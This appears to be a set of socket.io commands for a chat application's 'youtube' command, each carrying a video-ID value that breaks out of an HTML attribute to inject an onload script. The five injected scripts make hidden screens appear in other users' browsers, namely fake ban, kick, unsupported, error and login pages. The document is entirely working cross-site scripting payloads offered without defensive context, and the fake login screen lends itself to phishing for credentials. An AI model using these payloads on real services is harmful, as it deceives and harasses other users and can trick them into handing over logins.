// fake ban
socket.emit('command', {
  list: [
    'youtube',
    "VIDEO_ID\" onload='document.getElementById(\"page_ban\").style.display=\"block\";document.getElementById(\"page_ban\").style.visibility=\"visible\";document.getElementById(\"page_ban\").style.opacity=\"1\";'"
  ]
});
// fake kick
socket.emit('command', {
  list: [
    'youtube',
    "VIDEO_ID\" onload='document.getElementById(\"page_kick\").style.display=\"block\";document.getElementById(\"page_kick\").style.visibility=\"visible\";document.getElementById(\"page_kick\").style.opacity=\"1\";'"
  ]
});
// fake unsupported
socket.emit('command', {
  list: [
    'youtube',
    "VIDEO_ID\" onload='document.getElementById(\"page_unsupp\").style.display=\"block\";document.getElementById(\"page_unsupp\").style.visibility=\"visible\";document.getElementById(\"page_unsupp\").style.opacity=\"1\";'"
  ]
});
// fake error
socket.emit('command', {
  list: [
    'youtube',
    "VIDEO_ID\" onload='document.getElementById(\"page_error\").style.display=\"block\";document.getElementById(\"page_error\").style.visibility=\"visible\";document.getElementById(\"page_error\").style.opacity=\"1\";'"
  ]
});
// fake login
socket.emit('command', {
  list: [
    'youtube',
    "VIDEO_ID\" onload='document.getElementById(\"page_login\").style.display=\"block\";document.getElementById(\"page_login\").style.visibility=\"visible\";document.getElementById(\"page_login\").style.opacity=\"1\";'"
  ]
});
